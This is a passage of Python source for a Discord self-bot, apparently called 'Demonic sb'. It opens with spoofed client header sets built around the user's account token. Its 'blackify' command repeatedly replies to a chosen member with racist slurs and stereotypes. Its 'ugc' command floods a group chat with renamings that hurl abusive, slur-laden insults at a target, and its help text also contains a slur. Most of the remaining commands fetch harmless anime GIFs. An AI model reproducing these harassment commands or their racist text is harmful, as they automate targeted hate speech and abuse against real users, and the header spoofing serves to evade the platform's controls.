        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDIwIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMjAgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMjYgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMjYiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNDAyMzcsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM4NTE3fQ=="
    },

    "electron": {
        "authority": "discord.com",
        "method": "PATCH",
        "path": "/api/v9/users/@me",
        "scheme": "https",
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9021 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDIxIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI2MjEiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMjEgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMjYgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMjYiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNDAyMzgsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM4NTE4fQ=="
    },

    "opera": {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua": '"Opera GX";v="105", "Chromium";v="119", "Not?A_Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiT3BlcmEgR1giLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDIxIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI2MjEiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExOS4wLjAuMCBTYWZhcmkvNTM3LjM2IE9QUi8xMDUuMC4wLjAiLCJicm93c2VyX3ZlcnNpb24iOiIxMDUuMC4wLjAiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNDAyMzgsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM4NTE4fQ=="
    },

    "legacy": {
        "authority": "discord.com",
        "method": "PATCH",
        "scheme": "https",
        "accept": "/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US",
        "authorization": bot.http.token,
        "origin": "https://discord.com/",
        "sec-ch-ua": '"Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9020 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "X-Debug-Options": "bugReporterEnabled",
        "X-Discord-Locale": "en-US",
        "X-Discord-Timezone": "America/New_York",
        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDIwIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0IiwiYXBwX2FyY2giOiJpYTMyIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMjAgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMjYgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMjYiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNDAyMzcsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM4NTE3fQ=="
    },

    "brave": {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua": '"Brave";v="122", "Chromium";v="122", "Not(A:Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQnJhdmUiLCJkZXZpY2UiOiIiLCJzeXN0ZW1fbG9jYWxlIjoiZW4tVVMiLCJicm93c2VyX3VzZXJfYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTIyLjAuMC4wIFNhZmFyaS81MzcuMzYiLCJicm93c2VyX3ZlcnNpb24iOiIxMjIuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MjUwNjg0LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=="
    },

    "edge": {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua": '"Microsoft Edge";v="122", "Chromium";v="122", "Not(A:Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiTWljcm9zb2Z0IEVkZ2UiLCJkZXZpY2UiOiIiLCJzeXN0ZW1fbG9jYWxlIjoiZW4tVVMiLCJicm93c2VyX3VzZXJfYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTIyLjAuMC4wIFNhZmFyaS81MzcuMzYgRWRnLzEyMi4wLjAuMCIsImJyb3dzZXJfdmVyc2lvbiI6IjEyMi4wLjAuMCIsIm9zX3ZlcnNpb24iOiIxMCIsInJlZmVycmVyIjoiIiwicmVmZXJyaW5nX2RvbWFpbiI6IiIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNTA2ODQsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    },

    "safari": {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6Ik1hYyBPUyBYIiwiYnJvd3NlciI6IlNhZmFyaSIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzE1XzcpIEFwcGxlV2ViS2l0LzYwNS4xLjE1IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi8xNi41IFNhZmFyaS82MDUuMS4xNSIsImJyb3dzZXJfdmVyc2lvbiI6IjE2LjUiLCJvc192ZXJzaW9uIjoiMTAuMTUuNyIsInJlZmVycmVyIjoiIiwicmVmZXJyaW5nX2RvbWFpbiI6IiIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNTA2ODQsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    },


    "ipad": {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6ImlPUyIsImJyb3dzZXIiOiJTYWZhcmkiLCJkZXZpY2UiOiJpUGFkIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKGlQYWQ7IENQVSBPUyAxNl81IGxpa2UgTWFjIE9TIFgpIEFwcGxlV2ViS2l0LzYwNS4xLjE1IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi8xNi41IE1vYmlsZS8xNUUxNDggU2FmYXJpLzYwNC4xIiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTYuNSIsIm9zX3ZlcnNpb24iOiIxNi41IiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjI1MDY4NCwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
    },

    "android": {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "en-US",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "user-agent": "Discord-Android/126021",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6IkFuZHJvaWQiLCJicm93c2VyIjoiRGlzY29yZCBBbmRyb2lkIiwiZGV2aWNlIjoiUGl4ZWwgNiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImNsaWVudF92ZXJzaW9uIjoiMTI2LjIxIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiZGV2aWNlX3ZlbmRvcl9pZCI6Ijg4OGJhMTYwLWEwMjAtNDNiYS05N2FmLTYzNTFlNjE5ZjA0MSIsImJyb3dzZXJfdXNlcl9hZ2VudCI6IiIsImJyb3dzZXJfdmVyc2lvbiI6IiIsIm9zX3ZlcnNpb24iOiIzMSIsImNsaWVudF9idWlsZF9udW1iZXIiOjEyNjAyMSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
    },

    "ios": {
        "authority": "discord.com",
        "accept": "*/*",
        "accept-language": "en-US",
        "authorization": bot.http.token,
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "user-agent": "Discord-iOS/126021",
        "x-debug-options": "bugReporterEnabled",
        "x-discord-locale": "en-US",
        "x-super-properties": "eyJvcyI6ImlPUyIsImJyb3dzZXIiOiJEaXNjb3JkIGlPUyIsImRldmljZSI6ImlQaG9uZSAxNCBQcm8iLCJzeXN0ZW1fbG9jYWxlIjoiZW4tVVMiLCJjbGllbnRfdmVyc2lvbiI6IjEyNi4yMSIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImRldmljZV92ZW5kb3JfaWQiOiI5OTkxMTgyNC01NjczLTQxNDQtYTU3NS0xMjM0NTY3ODkwMTIiLCJicm93c2VyX3VzZXJfYWdlbnQiOiIiLCJicm93c2VyX3ZlcnNpb24iOiIiLCJvc192ZXJzaW9uIjoiMTYuNSIsImNsaWVudF9idWlsZF9udW1iZXIiOjEyNjAyMSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
    }
}


blackify_tasks = {}
blackifys = [
    "woah jamal dont pull out the nine",
    "cotton picker 🧑‍🌾",
    "back in my time...",
    "worthless nigger! 🥷",
    "chicken warrior 🍗",
    "its just some watermelon chill 🍉",
    "are you darkskined perchance?",
    "you... STINK 🤢"
]
@bot.command()
@require_password()
async def blackify(ctx, user: discord.Member):
    blackify_tasks[user.id] = True
    await ctx.send(f"```Seems to be that {user.name}, IS BLACK 🤢```")

    emojis = ['🍉', '🍗', '🤢', '🥷', '🔫']

    while blackify_tasks.get(user.id, False):
        try:
            async for message in ctx.channel.history(limit=10):
                if message.author.id == user.id:
                    for emoji in emojis:
                        try:
                            await message.add_reaction(emoji)
                        except:
                            pass
                    try:
                        reply = random.choice(blackifys)
                        await message.reply(reply)
                    except:
                        pass
                        
                    break
                    
            await asyncio.sleep(1)
        except:
            pass

@bot.command()
@require_password()
async def unblackify(ctx, user: discord.Member):
    if user.id in blackify_tasks:
        blackify_tasks[user.id] = False
        await ctx.send(f"```Seems to me that {user.name}, suddenly changed races 🧑‍🌾```")  
        
        



self_gcname = [
    "{UPuser} UR ASS LOL", "{UPuser}UR FUCKIN LOSER DORK FUCK", "{UPuser} BITCH ASS NIGGA DONT FOLD", "{UPuser} WE GOING FOREVER PEDO", "{UPuser}DEMONIC SELF BOT>>>", "{UPuser}DEMONIC X voz RUNS U", "{UPuser}ARIAN RUNS U ", "{UPuser}WIND RUNS U", "{UPuser} voz RUNS U", "{UPuser}LXC RUNS U ", "{UPuser}WEZZY RUNS U"

]

    
@bot.command()
@require_password()
async def ugc(ctx, user: discord.User):
    global ugc_task
    
    if ugc_task is not None:
        await ctx.send("```Group chat name changer is already running```")
        return
        
    if not isinstance(ctx.channel, discord.GroupChannel):
        await ctx.send("```This command can only be used in group chats.```")
        return

    async def name_changer():
        counter = 1
        unused_names = list(self_gcname)
        
        while True:
            try:
                if not unused_names:
                    unused_names = list(self_gcname)
                
                base_name = random.choice(unused_names)
                unused_names.remove(base_name)
                
                formatted_name = base_name.replace("{user}", user.name).replace("{UPuser}", user.name.upper())
                new_name = f"{formatted_name} {counter}"
                
                await ctx.channel._state.http.request(
                    discord.http.Route(
                        'PATCH',
                        '/channels/{channel_id}',
                        channel_id=ctx.channel.id
                    ),
                    json={'name': new_name}
                )
                
                await asyncio.sleep(0.1)
                counter += 1
                
            except discord.HTTPException as e:
                if e.code == 429:
                    retry_after = e.retry_after if hasattr(e, 'retry_after') else 1
                    await asyncio.sleep(retry_after)
                    continue
                else:
                    await ctx.send(f"```Error: {str(e)}```")
                    break
            except asyncio.CancelledError:
                break
            except Exception as e:
                await ctx.send(f"```Error: {str(e)}```")
                break

    ugc_task = asyncio.create_task(name_changer())
    await ctx.send("```Group chat name changer started```")

@bot.command()
@require_password()
async def ugcend(ctx):
    global ugc_task
    
    if ugc_task is None:
        await ctx.send("```Group chat name changer is not currently running```")
        return
        
    ugc_task.cancel()
    ugc_task = None
    await ctx.send("```Group chat name changer stopped```")




ansi_red = '\u001b[31m'
ansi_reset = '\u001b[0m'

def format_help_message(command_obj):
    help_message = f"{ansi_color}Command Help :{ansi_reset} {command_obj.qualified_name}\n\n"
    help_message += f"[{ansi_color}Usage:{ansi_reset}] {command_obj.qualified_name} {command_obj.signature}\n"
    help_message += f"[{ansi_color}Description:{ansi_reset}] {command_obj.help if command_obj.help else 'No description available.'}"
    return help_message

@bot.command()
@require_password()
async def help(ctx, command_name: str = None):
    if command_name is None:
        await ctx.send(f"```ansi{ansi_color}\nProvide a command fuck ass nigga the usage is :  {prefix}help <command>\n {ansi_reset}", delete_after=10)
        return

    command_obj = bot.get_command(command_name)
    if command_obj:
        help_message = format_help_message(command_obj)
        await ctx.send(f"```ansi\n{help_message}\n```", delete_after=60)
    else:
        await ctx.send(f"No command named '{command_name}' found.", delete_after=10)


mimic_user = None  

@bot.command()
@require_password()
async def mimic(ctx, user: discord.Member):
    global mimic_user
    mimic_user = user 
    await ctx.send(f"```Now mimicking {user.display_name}'s messages.```")


@bot.command()
@require_password()
async def mimicoff(ctx):
    global mimic_user
    mimic_user = None 
    await ctx.send("```Stopped mimicking messages.```")
    
async def fetch_anime_gif(action):
    async with aiohttp.ClientSession() as session:
        async with session.get(f"https://api.waifu.pics/sfw/{action}") as r:
            if r.status == 200:
                data = await r.json()
                return data['url']  
            else:
                return None
            
            
@bot.command()
@require_password()
async def hypesquad(ctx, house: str):
    house_ids = {
        "bravery": 1,
        "brilliance": 2,
        "balance": 3
    }

    headers = {
        "Authorization": bot.http.token, 
        "Content-Type": "application/json"
    }

    if house.lower() == "off":
        url = "https://discord.com/api/v9/hypesquad/online"
        async with aiohttp.ClientSession() as session:
            async with session.delete(url, headers=headers) as response:
                if response.status == 204:
                    await ctx.send("```HypeSquad house removed.```")
                else:
                    error_message = await response.text()
                    await ctx.send(f"```Failed to remove HypeSquad house: {response.status} - {error_message}```")
        return

    house_id = house_ids.get(house.lower())
    if house_id is None:
        await ctx.send("```Invalid house. Choose from 'bravery', 'brilliance', 'balance', or 'off'.```")
        return

    payload = {"house_id": house_id}
    url = "https://discord.com/api/v9/hypesquad/online"

    async with aiohttp.ClientSession() as session:
        async with session.post(url, headers=headers, json=payload) as response:
            if response.status == 204:
                await ctx.send(f"```HypeSquad house changed to {house.capitalize()}.```")
            else:
                error_message = await response.text()
                await ctx.send(f"```Failed to change HypeSquad house: {response.status} - {error_message}```")

@bot.command(name="kiss")
@require_password()
async def kiss(ctx, user: discord.User = None):
    if not user:
        await ctx.send("```You need to mention someone to kiss!```")
        return

    gif_url = await fetch_anime_gif("kiss")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} sends an anime kiss to {user.display_name}! 💋```\n[Demonic sb]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime kiss GIF right now, try again later!```")
@bot.command(name="slap")
@require_password()
async def slap(ctx, member: discord.Member = None):
    if not member:
        await ctx.send("```You need to mention someone to slap!```")
        return

    gif_url = await fetch_anime_gif("slap")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} slaps {member.display_name}! 👋```\n[DEMONIC sb]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime slap GIF right now, try again later!```")


@bot.command(name="hurt")
@require_password()
async def hurt(ctx, member: discord.Member = None):
    if not member:
        await ctx.send("```You need to mention someone to kill!```")
        return

    gif_url = await fetch_anime_gif("kill")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} kills {member.display_name}! ☠```\n[Demonic sb]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime kill GIF right now, try again later!```")

@bot.command(name="pat")
@require_password()
async def pat(ctx, member: discord.Member = None):
    if not member:
        await ctx.send("```You need to mention someone to pat!```")
        return

    gif_url = await fetch_anime_gif("pat")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} pats {member.display_name}! 🖐```\n[demonic  sb]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime pat GIF right now, try again later!```")

@bot.command(name="wave")
@require_password()
async def wave(ctx, member: discord.Member = None):
    if not member:
        await ctx.send("```You need to mention someone to wave at!```")
        return

    gif_url = await fetch_anime_gif("wave")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} waves at {member.display_name}! 👋```\n[DEMONIC sb]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime wave GIF right now, try again later!```")

@bot.command(name="hug")
@require_password()
async def hug(ctx, member: discord.Member = None):
    if not member:
        await ctx.send("```You need to mention someone to hug!```")
        return

    gif_url = await fetch_anime_gif("hug")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} hugs {member.display_name}! 🤗```\n[DEMONIC APOP sb]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime hug GIF right now, try again later!```")

@bot.command(name="cuddle")
@require_password()
async def cuddle(ctx, member: discord.Member = None):
    if not member:
        await ctx.send("```You need to mention someone to cuddle!```")
        return

    gif_url = await fetch_anime_gif("cuddle")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} cuddles {member.display_name}! 🤗```\n[DEMONIC sb]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime cuddle GIF right now, try again later!```")

@bot.command(name="lick")
@require_password()
async def lick(ctx, member: discord.Member = None):
    if not member:
        await ctx.send("```You need to mention someone to lick!```")
        return

    gif_url = await fetch_anime_gif("lick")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} licks {member.display_name}! 😋```\n[DEMONIC APOP sb]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime lick GIF right now, try again later!```")

@bot.command(name="bite")
@require_password()
async def bite(ctx, member: discord.Member = None):
    if not member:
        await ctx.send("```You need to mention someone to bite!```")
        return

    gif_url = await fetch_anime_gif("bite")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} bites {member.display_name}! 🐍```\n[DEMONIC sb]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime bite GIF right now, try again later!```")

@bot.command(name="bully")
@require_password()
async def bully(ctx, member: discord.Member = None):
    if not member:
        await ctx.send("```You need to mention someone to bully!```")
        return

    gif_url = await fetch_anime_gif("bully")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} bullies {member.display_name}! 😠```\n[DEMONIC sb]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime bully GIF right now, try again later!```")

@bot.command(name="poke")
@require_password()
async def poke(ctx, member: discord.Member = None):
    if not member:
        await ctx.send("```You need to mention someone to poke!```")
        return

    gif_url = await fetch_anime_gif("poke")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} pokes {member.display_name}! 👉👈```\n[DEMONIC sb]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime poke GIF right now, try again later!```")


@bot.command(name="dance")
@require_password()
async def dance(ctx):
    gif_url = await fetch_anime_gif("dance")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} dances! 💃```\n[DEMONIC sb]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime dance GIF right now, try again later!```")

@bot.command(name="cry")
@require_password()
async def cry(ctx):
    gif_url = await fetch_anime_gif("cry")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} is crying! 😢```\n[demonic sb]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime cry GIF right now, try again later!```")

@bot.command(name="sleep")
@require_password()
async def sleep(ctx):
    gif_url = await fetch_anime_gif("sleep")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} is sleeping! 😴```\n[demonic APOP sb]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime sleep GIF right now, try again later!```")

@bot.command(name="blush")
@require_password()
async def blush(ctx):
    gif_url = await fetch_anime_gif("blush")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} just blushed.! 😊```\n[DEMONIC  sb]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime blush GIF right now, try again later!```")

@bot.command(name="wink")
@require_password()
async def wink(ctx):
    gif_url = await fetch_anime_gif("wink")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} winks! 😉```\n[DEMONIC sb]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime wink GIF right now, try again later!```")

@bot.command(name="smile")
@require_password()
async def smile(ctx):
    gif_url = await fetch_anime_gif("smile")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} smiles! 😊```\n[demonic sb]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime smile GIF right now, try again later!```")


@bot.command(name="highfive")
@require_password()
async def highfive(ctx, member: discord.Member = None):
    if not member:
        await ctx.send("```You need to mention someone to high-five!```")
        return

    gif_url = await fetch_anime_gif("highfive")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} high-fives {member.display_name}! 🙌```\n[DEMONIC sb]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime high-five GIF right now, try again later!```")

@bot.command(name="handhold")
@require_password()
async def handhold(ctx, member: discord.Member = None):
    if not member:
        await ctx.send("```You need to mention someone to hold hands with!```")
        return

    gif_url = await fetch_anime_gif("handhold")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} holds hands with {member.display_name}! 🤝```\n[DEMONIC sb]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime handhold GIF right now, try again later!```")

@bot.command(name="nom")
@require_password()
async def nom(ctx, member: discord.Member = None):
    if not member:
        await ctx.send("```You need to mention someone to nom!```")
        return

    gif_url = await fetch_anime_gif("nom")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} noms on {member.display_name}! 😋```\n[DEMONIC sb]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime nom GIF right now, try again later!```")

@bot.command(name="smug")
@require_password()
async def smug(ctx):
    gif_url = await fetch_anime_gif("smug")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} has a smug look! 😏```\n[DEMONIC sb]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime smug GIF right now, try again later!```")

@bot.command(name="bonk")
@require_password()
async def bonk(ctx, member: discord.Member = None):
    if not member:
        await ctx.send("```You need to mention someone to bonk!```")
        return

    gif_url = await fetch_anime_gif("bonk")

    if gif_url:
        await ctx.send(f"```{ctx.author.display_name} bonks {member.display_name}! 🤭```\n[DEMONIC SB]({gif_url})")
    else:
        await ctx.send("```Couldn't fetch an anime bonk GIF right now, try again later!```")

@bot.command(name="yeet")
@require_password()
async def yeet(ctx, member: discord.Member = None):
    if not member:
        await ctx.send("```You need to mention someone to yeet!```")
        return

